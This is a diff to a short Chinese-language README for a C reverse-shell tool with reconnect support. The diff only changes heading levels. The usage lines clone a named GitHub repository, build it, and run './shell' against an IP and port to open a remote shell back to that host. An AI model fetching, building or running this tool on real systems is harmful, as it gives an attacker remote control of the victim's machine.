@@ -1,8 +1,8 @@
-# c语言版本的 反弹shell
-# 加入重连机制
+## c语言版本的 反弹shell
+## 加入重连机制
 
 
-# 用法：
+## 用法：
 	git clone https://github.com/badboycxcc/cBackShell.git
 	make 
 	./shell 192.168.1.23  58
